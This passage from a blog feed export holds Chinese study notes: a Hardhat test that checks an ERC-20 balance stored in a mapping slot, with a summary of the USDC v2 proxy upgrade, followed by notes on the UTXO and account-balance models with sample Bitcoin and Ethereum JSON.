<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it.<span class="title function_">only</span>(<span class="string">&quot;test mapping storage slot&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;<span class="title class_">Token</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Storage slot 0 contains &quot;balances&quot; (mapping(address =&gt; uint256))</span></span><br><span class="line">    <span class="comment">// Derive slot position for the key k</span></span><br><span class="line">    <span class="comment">// 1.从存储槽直接读取用户tokenOwner的余额</span></span><br><span class="line">    <span class="keyword">const</span> k = tokenOwner.<span class="property">address</span>.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">toLowerCase</span>().<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;k: &#x27;</span> + k);</span><br><span class="line">    <span class="keyword">const</span> p = <span class="string">&quot;0&quot;</span>.<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;p: &#x27;</span> + p);</span><br><span class="line">    <span class="keyword">const</span> valueSlotPos = ethers.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;0x&quot;</span> + k + p);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;valueSlotPos: &#x27;</span> + valueSlotPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tokenOwnerBalanceAtStorage = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getStorageAt</span>(<span class="title class_">Token</span>.<span class="property">address</span>, valueSlotPos);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;tokenOwnerBalanceAtStorage: &#x27;</span> + tokenOwnerBalanceAtStorage);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.对取出的存储槽的值进行类型转换</span></span><br><span class="line">    <span class="comment">// 0x00000000000000000000000000000000000000000000003635c9adc5dea00000</span></span><br><span class="line">    <span class="comment">// 去掉0x 去掉前面的0然后 加上0x</span></span><br><span class="line">    <span class="keyword">const</span> tokenOwnerBalanceAtStorageFormat = <span class="string">&#x27;0x&#x27;</span> + tokenOwnerBalanceAtStorage.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/\b(0+)/gi</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tokenOwnerBalanceAtStorageFormat)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tokenOwnerBalanceAtStorageInt = <span class="built_in">parseInt</span>(tokenOwnerBalanceAtStorageFormat, <span class="number">16</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;tokenOwnerBalanceAtStorageInt: &#x27;</span> + tokenOwnerBalanceAtStorageInt);</span><br><span class="line">    <span class="comment">// console.log(typeof tokenOwnerBalanceAtStorageInt); // number</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tokenOwnerBalanceAtStorageSring = <span class="title class_">BigInt</span>(tokenOwnerBalanceAtStorageInt).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;tokenOwnerBalanceAtStorageSring: &#x27;</span> + tokenOwnerBalanceAtStorageSring);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.通过合约查询tokenOwner余额</span></span><br><span class="line">    <span class="keyword">const</span> ownerBalance = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">balanceOf</span>(tokenOwner.<span class="property">address</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ownerBalance: &#x27;</span> + ownerBalance);</span><br><span class="line">    <span class="comment">// console.log(typeof ownerBalance);</span></span><br><span class="line">    <span class="comment">// const check = await ethers.BigNumber.isBigNumber(ownerBalance);</span></span><br><span class="line">    <span class="comment">// console.log(check); // is bignumber</span></span><br><span class="line">    <span class="keyword">const</span> ownerBalanceNumber = ownerBalance.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ownerBalanceNumber: &#x27;</span> + ownerBalanceNumber);</span><br><span class="line">    <span class="comment">// console.log(&quot;ownerBalance Readable: &quot; + ethers.utils.formatUnits(ownerBalance, 18));</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4.比对</span></span><br><span class="line">    <span class="title function_">expect</span>(ownerBalanceNumber).<span class="property">to</span>.<span class="title function_">equal</span>(tokenOwnerBalanceAtStorageSring);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="测试结果：-8">测试结果：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">k: 000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266</span><br><span class="line">p: 0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">valueSlotPos: 0x723077b8a1b173adc35e5f0e7e3662fd1208212cb629f9c128551ea7168da722</span><br><span class="line">tokenOwnerBalanceAtStorage: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000</span><br><span class="line">0x3635c9adc5dea00000</span><br><span class="line">tokenOwnerBalanceAtStorageInt: 1e+21</span><br><span class="line">tokenOwnerBalanceAtStorageSring: 1000000000000000000000</span><br><span class="line">ownerBalance: 1000000000000000000000</span><br><span class="line">ownerBalanceNumber: 1000000000000000000000</span><br></pre></td></tr></table></figure>
<h1>Summary：</h1>
<p>介绍了usdcV2的现况，需要安全地进行升级。虽然一般情况下智能合约一旦发布就不可修改，但可以通过代理合约的方式来进行升级。代理合约升级的原理：<code>代理合约</code>使用<code>fallback()</code>函数来捕获用户任意的函数调用，通过<code>delegatecall</code>传递函数调用给<code>执行合约</code>。</p>
<p>在升级过程中，为了防止数据丢失，要注意的点：</p>
<pre><code>1. 状态变量在合约存储中的布局方式 :从位置零开始，按顺序排列在存储槽中
2. 合约状态变量存储在代理合约里而不是在执行合约里。
</code></pre>
<p>为了保证存储槽里的顺序不变，有几种方法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>仔细枚举所有声明的状态变量并确保顺序不会改变</p>
</li>
<li class="lvl-2">
<p>专用一个合约来保存所有状态变量</p>
</li>
<li class="lvl-2">
<p>使用映射来包装状态变量</p>
</li>
<li class="lvl-2">
<p>使用 EVM 操作码<code>SLOAD</code>和<code>SSTORE</code>直接指定存储槽。</p>
</li>
<li class="lvl-2">
<p>可以考虑较新的设计模式，例如EIP-2535 Diamond 标准</p>
</li>
</ul>
<p>在usdcV2升级过程中，为了验证是否保留了原始存储槽的顺序，创建了单元测试脚本：去读取、验证各类型的状态变量在存储槽中的值除了单元测试以外，还fork了主网在本地进行更多的手工测试。在真正升级时，准备了完备的升级脚本：保证升级操作在在一个原子事务中完成，如果检测到问题，它会回滚整个升级过程。最后，成功升级</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.coinbase.com/usdc-v2-upgrading-a-multi-billion-dollar-erc-20-token-b57cd9437096">USDC v2: Upgrading a multi-billion dollar ERC-20 token</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/aurora-is-near/hardhat-storage-layout">hardhat-storage-layout</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-UTXO与账户余额模型(一)</title>
    <url>/2022/24724.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://draveness.me/utxo-account-models/">UTXO 与账户余额模型</a>，学习记录。<br />
内容有点多，分成两部分来学习。</p>
<p>目前的绝大多数区块链项目不是使用 <code>UTXO模型</code>作为底层的数据结构，就是使用<code>账户余额模型</code>存储交易相关的信息。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809113059.png" alt="20220809113059" /><br />
在这篇文章中，我们会分别展示两种不同区块链模型的实现方式以及优缺点，<br />
我们会以 <code>Bitcoin</code> 和 <code>Ethereum</code> 为例分别介绍 UTXO 模型和账户余额模型。</p>
<blockquote>
<p>先看UTXO模型,刚好有一些疑问</p>
<p>这篇文章写得非常好，后续要反复多读几遍🤡🤡🤡</p>
</blockquote>
<h1>区块与区块链:</h1>
<p>在具体介绍 UTXO 模型和账户余额模型之前，我们不得不首先介绍它们两者、甚至所有区块链应用中最重要的概念和数据结构，也就是<code>区块（Block）</code>。<br />
区块链其实就是由<strong>一个长度不断增长的链表</strong>组成的，其中包含了很多记录，也就是区块。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809140256.png" alt="20220809140256" /><br />
在上述区块链网络中，绿色的区块都被包含在主链中，所有黄色的区块都是<code>孤块（Orphan Block）</code>，它们没有被主链接受，在每一个区块链网络中只能有一条主链，也就是<strong>最长的有效链</strong>，也是当前区块链网络中所有节点达成的共识。</p>
<h1>区块的数据结构:</h1>
<p>想要了解区块到底是什么，最简单快捷的办法就是分析它的数据结构，以 Bitcoin 中的区块 <code>#514095</code> 为例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">　　<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;00000000000000000018b0a6ae560fa33c469b6528bc9e0fb0c669319a186c33&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;confirmations&quot;</span>:<span class="number">1009</span>,</span><br><span class="line">　　<span class="string">&quot;strippedsize&quot;</span>:<span class="number">956228</span>,</span><br><span class="line">　　<span class="string">&quot;size&quot;</span>:<span class="number">1112639</span>,</span><br><span class="line">　　<span class="string">&quot;weight&quot;</span>:<span class="number">3981323</span>,</span><br><span class="line">　　<span class="string">&quot;height&quot;</span>:<span class="number">514095</span>,</span><br><span class="line">　　<span class="string">&quot;version&quot;</span>:<span class="number">536870912</span>,</span><br><span class="line">　　<span class="string">&quot;versionHex&quot;</span>:<span class="string">&quot;20000000&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;merkleroot&quot;</span>:<span class="string">&quot;5f8f8e053fd4c0c3175c10ac5189c15e6ba218909319850936fe54934dcbfeac&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;tx&quot;</span>:[</span><br><span class="line">　　  <span class="comment">// ...</span></span><br><span class="line">　　],</span><br><span class="line">　　<span class="string">&quot;time&quot;</span>:<span class="number">1521380124</span>,</span><br><span class="line">　　<span class="string">&quot;mediantime&quot;</span>:<span class="number">1521377506</span>,</span><br><span class="line">　　<span class="string">&quot;nonce&quot;</span>:<span class="number">3001236454</span>,</span><br><span class="line">　　<span class="string">&quot;bits&quot;</span>:<span class="string">&quot;17514a49&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;difficulty&quot;</span>:<span class="number">3462542391191.563</span>,</span><br><span class="line">　　<span class="string">&quot;chainwork&quot;</span>:<span class="string">&quot;0000000000000000000000000000000000000000014d2b41a340e60b72292430&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;previousblockhash&quot;</span>:<span class="string">&quot;000000000000000000481ab128418847dc25db4dafec464baa5a33e66490990b&quot;</span>,</span><br><span class="line">　　<span class="string">&quot;nextblockhash&quot;</span>:<span class="string">&quot;0000000000000000000c74966205813839ad1c6d55d75f95c9c5f821db9c3510&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个 Block 的结构体中，<code>previousblockhash</code> 和 <code>merkleroot</code> 是两个最重要的字段；<br />
前者是一个哈希指针，它其实是前一个 Block 的哈希，通过 <code>previousblockhash</code> 我们能递归地找到全部的 Block，也就是整条主链。<br />
后者是一个 Merkle 树的根，<strong>Merkle 树中包含整个 Block 中的全部交易</strong>，通过保存 merkleroot，我们可以保证当前 Block 中任意交易都不会被修改。</p>
<p>Ethereum 的区块链模型虽然与 Bitcoin 有非常大的不同，但是它的 Block 结构中也有着类似的信息：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">   <span class="string">&quot;result&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;author&quot;</span>:<span class="string">&quot;0x00d8ae40d9a06d0e7a2877b62e32eb959afbe16d&quot;</span>,</span><br><span class="line">      <span class="string">&quot;difficulty&quot;</span>:<span class="string">&quot;0x785042b0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;extraData&quot;</span>:<span class="string">&quot;0x414952412f7630&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gasLimit&quot;</span>:<span class="string">&quot;0x47b784&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gasUsed&quot;</span>:<span class="string">&quot;0x44218a&quot;</span>,</span><br><span class="line">      <span class="string">&quot;hash&quot;</span>:<span class="string">&quot;0x4de91e4af8d135e061d50ddd6d0d6f4119cd0f7062ebe8ff2d79c5af0e8344b9&quot;</span>,</span><br><span class="line">      <span class="string">&quot;logsBloom&quot;</span>:<span class="string">&quot;0xquot;</span>,</span><br><span class="line">      <span class="string">&quot;miner&quot;</span>:<span class="string">&quot;0x00d8ae40d9a06d0e7a2877b62e32eb959afbe16d&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mixHash&quot;</span>:<span class="string">&quot;0xb8155224974967443d8b83e484402fb6e1e18ff69a8fc5acdda32f2bcc6dd443&quot;</span>,</span><br><span class="line">      <span class="string">&quot;nonce&quot;</span>:<span class="string">&quot;0xad14fb6803147c7c&quot;</span>,</span><br><span class="line">      <span class="string">&quot;number&quot;</span>:<span class="string">&quot;0x2000f1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;parentHash&quot;</span>:<span class="string">&quot;0x31919e2bf29306778f50bbc376bd490a7d056ddfd5b1f615752e79f32c7f1a38&quot;</span>,</span><br><span class="line">      <span class="string">&quot;receiptsRoot&quot;</span>:<span class="string">&quot;0xa2a7af5e3b9e1bbb6252ba82a09302321b8f0eea7ec8e3bb977401e4f473e672&quot;</span>,</span><br><span class="line">      <span class="string">&quot;sealFields&quot;</span>:[</span><br><span class="line">         <span class="string">&quot;0xa0b8155224974967443d8b83e484402fb6e1e18ff69a8fc5acdda32f2bcc6dd443&quot;</span>,</span><br><span class="line">         <span class="string">&quot;0x88ad14fb6803147c7c&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;sha3Uncles&quot;</span>:<span class="string">&quot;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&quot;</span>,</span><br><span class="line">      <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0x276&quot;</span>,</span><br><span class="line">      <span class="string">&quot;stateRoot&quot;</span>:<span class="string">&quot;0x87e7e54cf229003014f453d64f0344e2ba4fc7ee3b95c7dd2642cca389fa1efe&quot;</span>,</span><br><span class="line">      <span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;0x5a10968a&quot;</span>,</span><br><span class="line">      <span class="string">&quot;totalDifficulty&quot;</span>:<span class="string">&quot;0x1804de0c47ffe1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;transactions&quot;</span>:[...],</span><br><span class="line">      <span class="string">&quot;transactionsRoot&quot;</span>:<span class="string">&quot;0xc2091b032961ca23cf8323ea827e8956fe6dda9e68d75bcfaa8b910035397e35&quot;</span>,</span><br><span class="line">      <span class="string">&quot;uncles&quot;</span>:[]</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">&quot;id&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>parentHash</code> 和 <code>transactionsRoot</code> 分别对应着 Bitcoin 中 <code>previousblockhash</code> 和 <code>merkleroot</code>，这两者在整个区块链网络中是非常重要的。</p>
<h2 id="哈希指针">哈希指针:</h2>
<p>Block 结构体中的<code>哈希指针</code>在区块链中有两个作用，它不仅能够连接不同的区块，还能够对 Block 进行验证，保证 Block 中的数据不会被其他恶意节点篡改。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809140617.png" alt="20220809140617" /><br />
除了第一个 Block，每一个 Block 中的 <code>prev_hash</code> 都是前一个 Block 的哈希，如果某一个节点想要修改主链上 Block 的交易，就会改变当前 Block 的哈希，后面的 Block 就没有办法通过 <code>prev_hash</code> 找到前面的链，所以当前节点篡改交易的行为就会被其他节点发现。</p>
<h2 id="Merkle-Tree">Merkle Tree:</h2>
<p>另一个字段 <code>merkleroot</code> 其实就是一个 Merkle 树 的根节点，它其实是一种使用哈希指针连接的数据结构；<br />
虽然 Merkle 树有<code>叶节点</code>和<code>非叶节点</code>，但是它只有<code>叶节点</code>会存储数据，所有的<code>非叶结点</code>都是用于验证数据完整性的哈希。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809140715.png" alt="20220809140715" /></p>
<p>每一个 Block 中的全部交易都是存储在这个 Merkle 树中并将 <code>merkleroot</code> 保存在 Block 的结构体中，保证当前 Block 中任意交易的篡改都能被立刻发现。</p>
<h2 id="小结">小结:</h2>
<p><code>prev_hash</code> 和 <code>merkleroot</code> 分别通过『指针』的方式保证所有的 Block 和交易都是连接起来的，最终保证 Block 和交易不会被恶意节点或攻击者篡改，几乎全部的区块链项目都会使用类似方式连接不同的 Block 和交易，这可以说是区块链项目的基础设施和标配了。</p>
<h1>UTXO 模型:</h1>
<p>作为最早出现的加密货币，Bitcoin 就采用了 <code>UTXO 模型</code>作为其底层存储的数据结构，其全称为 <code>Unspent Transaction output</code>，也就是<strong>未被使用的交易输出</strong>。</p>
<p>在 Bitcoin 以及其他使用 <code>UTXO 模型</code>的加密货币中，<strong>某一个『账户』中的余额并不是由一个数字表示的，而是由当前区块链网络中所有跟当前『账户』有关的 UTXO 组成的</strong>。</p>
<blockquote>
<p>专业的定义：<code>UTXO 模型</code>是资产在用户之间移动的有向图</p>
<p>大白话定义：<code>UTXO 模型</code>——假设所有的资产都是一个个的硬币，那我们记下所有硬币的「流动轨迹」，知道当前没花的硬币都在哪里，那么我们无需给每个人创建账户，也能知道每个人有多少钱。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809140957.png" alt="20220809140957" /><br />
上图中所有<code>绿色的交易输出</code>才是 UTXO，<code>红色的交易输出</code>已经被当前『账户』使用了，所以在计算当前账户的余额时只会考虑绿色的交易输出，也就是 UTXO。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;addr&quot;</span>:<span class="string">&quot;14uhqGYDEhqwfdoP59QdLWdt4ha5CHttwQ&quot;</span>,</span><br><span class="line">   <span class="string">&quot;n&quot;</span>:<span class="number">1</span>,</span><br><span class="line">   <span class="string">&quot;script&quot;</span>:<span class="string">&quot;76a9142ae017a5bd24a3f935897085253e503fbfd66f4e88ac&quot;</span>,</span><br><span class="line">   <span class="string">&quot;spent&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">   <span class="string">&quot;tx_index&quot;</span>:<span class="number">335926477</span>,</span><br><span class="line">   <span class="string">&quot;type&quot;</span>:<span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;value&quot;</span>:<span class="number">21680000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述的 UTXO 中包含了很多信息，例如：包含当前 UTXO 属于的<code>交易索引 tx_index</code>、<code>交易接收方的地址 addr</code>、<code>交易的数额 value</code>。</p>
<h2 id="交易">交易:</h2>
<p>UTXO 其实就是交易的一部分，基于 UTXO 模型的交易由<code>输入</code>和<code>输出</code>两个部分组成：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;txid&quot;</span>:<span class="string">&quot;5be7a9e47f56c98e5297a44df52da0475f448ece98bb51489103cdf70653092f&quot;</span>,</span><br><span class="line">   <span class="string">&quot;hash&quot;</span>:<span class="string">&quot;5be7a9e47f56c98e5297a44df52da0475f448ece98bb51489103cdf70653092f&quot;</span>,</span><br><span class="line">   <span class="string">&quot;version&quot;</span>:<span class="number">1</span>,</span><br><span class="line">   <span class="string">&quot;size&quot;</span>:<span class="number">224</span>,</span><br><span class="line">   <span class="string">&quot;vsize&quot;</span>:<span class="number">224</span>,</span><br><span class="line">   <span class="string">&quot;locktime&quot;</span>:<span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;vin&quot;</span>: [...],</span><br><span class="line">   <span class="string">&quot;vout&quot;</span>: [...],</span><br><span class="line">   <span class="string">&quot;hex&quot;</span>:<span class="string">&quot;0100000001a90b4101e6cbb75e1ff885b6358264627581e9f96db9ae609acec98d72422067000000006b483045022100c42c89eb2b10aeefe27caea63f562837b20290f0a095bda39bec37f2651af56b02204ee4260e81e31947d9297e7e9e027a231f5a7ae5e21015aabfdbdb9c6bbcc76e0121025e6e9ba5111117d49cfca477b9a0a5fba1dfcd18ef91724bc963f709c52128c4ffffffff02a037a0000000000017a91477df4f8c95e3d35a414d7946362460d3844c2c3187e6f6030b000000001976a914aba7915d5964406e8a02c3202f1f8a4a63e95c1388ac00000000&quot;</span>,</span><br><span class="line">   <span class="string">&quot;blockhash&quot;</span>:<span class="string">&quot;0000000000000000000c23ca00756364067ce5e815deb5982969df476bfc0b5c&quot;</span>,</span><br><span class="line">   <span class="string">&quot;confirmations&quot;</span>:<span class="number">5</span>,</span><br><span class="line">   <span class="string">&quot;time&quot;</span>:<span class="number">1521981077</span>,</span><br><span class="line">   <span class="string">&quot;blocktime&quot;</span>:<span class="number">1521981077</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>交易对象中的大多数其它字段并没有什么意义，只是对当前的交易进行了一些描述，让我们能够更好的理解当前交易的相关信息，例如：上述交易中的 size 和 vsize 字段可以从交易其他部分计算出来。<br />
在每一笔合法的交易中，所有的输入的 value 之和必须大于所有输出的 value 之和，这两者之间的差值就是矿工费：<br />
<code>sum(inputs.value) = sum(outputs.value) + fee</code></p>
<p>基于 UTXO 的交易模型，与我们在日常生活中使用纸币的场景是非常相似的，每一张纸币都是不可分割的整体，当我们想要使用现金购买商品或者服务时，往往都会获得找零。<br />
<code>inputs = price + change + fee</code></p>
<p><strong>每一个 UTXO 和纸币一样，只可能有两种状态，要么是没有被花费的，要么就是已经被花费，所有权变成了其他人或者地址，成为其他地址的 UTXO。</strong></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809141452.png" alt="20220809141452" /><br />
在基于 UTXO 的区块链网络中，除了<code>找零（Change）</code>非常常见之外，将多个 UTXO <code>整合（Consolidate）</code>成一个 UTXO 的操作也比较常见，在 Bitcoin 的网络中，无论当前的 UTXO 中有多少钱，每一个 UTXO 的大小都是差不多的，所以在进行大额转账时，往往需要多个 UTXO 作为输入，这样会明显的增加交易的矿工费。</p>
<h2 id="输入和签名">输入和签名:</h2>
<p>UTXO 模型中的每一笔交易都是由多个交易输入组成的，这些输入其实就是 UTXO + 签名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;vin&quot;</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">&quot;txid&quot;</span>:<span class="string">&quot;672042728dc9ce9a60aeb96df9e9817562648235b685f81f5eb7cbe601410ba9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;vout&quot;</span>:<span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;scriptSig&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;asm&quot;</span>:<span class="string">&quot;3045022100c42c89eb2b10aeefe27caea63f562837b20290f0a095bda39bec37f2651af56b02204ee4260e81e31947d9297e7e9e027a231f5a7ae5e21015aabfdbdb9c6bbcc76e[ALL] 025e6e9ba5111117d49cfca477b9a0a5fba1dfcd18ef91724bc963f709c52128c4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hex&quot;</span>:<span class="string">&quot;483045022100c42c89eb2b10aeefe27caea63f562837b20290f0a095bda39bec37f2651af56b02204ee4260e81e31947d9297e7e9e027a231f5a7ae5e21015aabfdbdb9c6bbcc76e0121025e6e9ba5111117d49cfca477b9a0a5fba1dfcd18ef91724bc963f709c52128c4&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">&quot;sequence&quot;</span>:<span class="number">4294967295</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述 JSON 其实就是 Bitcoin 交易 <code>#338309214</code> 的输入，这里的 <code>prev_out</code> 就来自于另一笔交易 <code>#338283541</code> 的输出，通过不停的回溯，最终我们会找到当前交易涉及的 <code>Coinbase</code>，也就是当前 UTXO 相关 Bitcoin 被挖出来的 Block 的首笔交易。</p>
<p>通过 <code>txid</code> 和 <code>vout</code> 两个字段，我们能够在区块链网络中定位到唯一一个 UTXO，这个 UTXO 加上持有当前 UTXO 的地址对交易的签名构成了一个交易输入。</p>
<h2 id="输出">输出:</h2>
<p>每一个交易都可能会有多个输出，也就是 <code>vout</code> 数组，每一个 <code>vout</code> 都可以指向不同的地址，其中也有当前输出包含的值 <code>value</code>，在这里也就是 Bitcoin 的单位：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;vout&quot;</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">&quot;value&quot;</span>:<span class="number">0.10500000</span>,</span><br><span class="line">         <span class="string">&quot;n&quot;</span>:<span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;scriptPubKey&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;asm&quot;</span>:<span class="string">&quot;OP_HASH160 77df4f8c95e3d35a414d7946362460d3844c2c31 OP_EQUAL&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hex&quot;</span>:<span class="string">&quot;a91477df4f8c95e3d35a414d7946362460d3844c2c3187&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reqSigs&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;scripthash&quot;</span>,</span><br><span class="line">            <span class="string">&quot;addresses&quot;</span>:[</span><br><span class="line">               <span class="string">&quot;3CcqrGq4oQcfx3u75ijj4tDiqf4HJvhoeP&quot;</span></span><br><span class="line">            ]</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">&quot;value&quot;</span>:<span class="number">1.84809190</span>,</span><br><span class="line">         <span class="string">&quot;n&quot;</span>:<span class="number">1</span>,</span><br><span class="line">         <span class="string">&quot;scriptPubKey&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;asm&quot;</span>:<span class="string">&quot;OP_DUP OP_HASH160 aba7915d5964406e8a02c3202f1f8a4a63e95c13 OP_EQUALVERIFY OP_CHECKSIG&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hex&quot;</span>:<span class="string">&quot;76a914aba7915d5964406e8a02c3202f1f8a4a63e95c1388ac&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reqSigs&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;pubkeyhash&quot;</span>,</span><br><span class="line">            <span class="string">&quot;addresses&quot;</span>:[</span><br><span class="line">               <span class="string">&quot;1GedHcxdxq2tab98hqAmREUK9BBYHKznof&quot;</span></span><br><span class="line">            ]</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一个未被使用的 vout 就是一个 UTXO（Unspent Transaction Output），我们可以通过其中的 addresses 字段找到持有当前输出的地址。</p>
<h2 id="小结-2">小结:</h2>
<p>UTXO 模型通过链式的方式组织所有交易的输入和输出，每一个交易的输出最终都能追寻到一个 <code>Coinbase</code>，也就是当前 Bitcoin 被挖出时的区块的第一笔交易。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809141725.png" alt="20220809141725" /><br />
由于在 UTXO 中没有账户的概念，所以并行地处理交易不会出现任何问题，同时不可变的账本能够让我们在 Bitcoin 节点快速更新时，也能分析某一时刻整个网络中数据的快照。</p>
<p>虽然 UTXO 模型的不可变账本条目带来一些好处，但是<strong>当我们需要计算某个地址中的余额时，需要遍历整个网络中的全部相关区块</strong>，同时，并行的处理交易虽然可行，不过并行的创建交易却会出现很多问题，例如多笔交易使用了同一个 UTXO，导致双花，最终只有一笔交易能够被网络确认。</p>
<p>UTXO 模型确实能够解决区块链世界中的各种问题，它的<strong>核心思想就是保证已经写入的数据不可变</strong>，链式的 UTXO 就是基于这一核心思想的，通过<code>哈希指针</code>连接不同交易的输入和输出，保证所有交易的合法性。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://draveness.me/utxo-account-models/">UTXO 与账户余额模型</a></p>
</li>
</ul>
<blockquote>
<p>这篇写得确实好，语言简单而清晰👍🏻👍🏻👍🏻</p>
</blockquote>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
